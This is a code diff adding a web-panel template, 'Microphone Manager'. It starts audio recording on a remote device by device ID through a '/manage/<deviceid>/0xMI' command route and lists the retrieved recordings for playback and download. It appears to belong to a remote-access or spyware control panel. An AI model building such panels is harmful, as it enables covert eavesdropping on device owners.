@@ -1,0 +1,114 @@
+<div class="data-container">
+  <div class="data-controls">
+    <div class="control-bar">
+      <h3><i class="microphone icon"></i> Microphone Manager</h3>
+      <div style="flex: 1;"></div>
+      <div style="display: flex; gap: 8px; align-items: center;">
+        <div class="ui right labeled input">
+          <input type="number" id="recordDuration" placeholder="Duration (sec)" value="10" style="width: 80px;">
+          <div class="ui basic label">sec</div>
+        </div>
+        <button class="btn btn-danger" onclick="recordAudio()">
+          <i class="circle icon"></i> Record Audio
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <div class="data-table-container">
+    <div class="card-header" style="padding: 16px 20px; background: #f7fafc; border-bottom: 1px solid #e2e8f0; font-weight: 700; color: #2d3748;">
+      <i class="list icon"></i> Recordings Log
+    </div>
+    <table class="table">
+      <thead>
+        <tr>
+          <th>File Name</th>
+          <th>Size</th>
+          <th>Date</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="dataTableBody">
+        <% if (pageData && pageData.length > 0) { %>
+          <% pageData.forEach(function(file) { %>
+            <tr>
+              <td>
+                <div style="display: flex; align-items: center; gap: 12px;">
+                  <i class="music icon" style="font-size: 20px; color: #e53e3e;"></i>
+                  <span style="font-weight: 600; color: #2d3748;"><%= file.originalName || file.name || 'Unknown' %></span>
+                </div>
+              </td>
+              <td><%= file.size ? (file.size / 1024).toFixed(2) + ' KB' : '-' %></td>
+              <td><%= file.time ? new Date(file.time).toLocaleString() : '-' %></td>
+              <td>
+                <div style="display: flex; gap: 8px;">
+                  <audio controls src="/client_downloads/<%= file.name || file.path %>" style="height: 32px; max-width: 200px;"></audio>
+                  <a href="/client_downloads/<%= file.name || file.path %>" download="<%= file.originalName || file.name %>" class="btn btn-sm btn-success">
+                    <i class="download icon"></i>
+                  </a>
+                </div>
+              </td>
+            </tr>
+          <% }); %>
+        <% } else { %>
+          <tr>
+            <td colspan="4" class="text-center" style="padding: 40px; color: #718096;">
+              <i class="microphone slash icon" style="font-size: 48px; margin-bottom: 16px; display: block; color: #cbd5e0;"></i>
+              No recordings available
+            </td>
+          </tr>
+        <% } %>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<style>
+  .data-container {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  .data-controls {
+    background: white;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+  }
+
+  .control-bar {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+</style>
+
+<script>
+  function recordAudio() {
+    const duration = document.getElementById('recordDuration').value;
+    if (!duration || duration <= 0) {
+      alert('Please enter a valid duration');
+      return;
+    }
+
+    fetch(`/manage/<%= deviceid %>/0xMI`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'same-origin',
+      body: JSON.stringify({
+        action: 'record',
+        sec: parseInt(duration)
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert(`Recording started for ${duration} seconds. Refresh later to see the file.`);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Failed to start recording');
+    });
+  }
+</script>
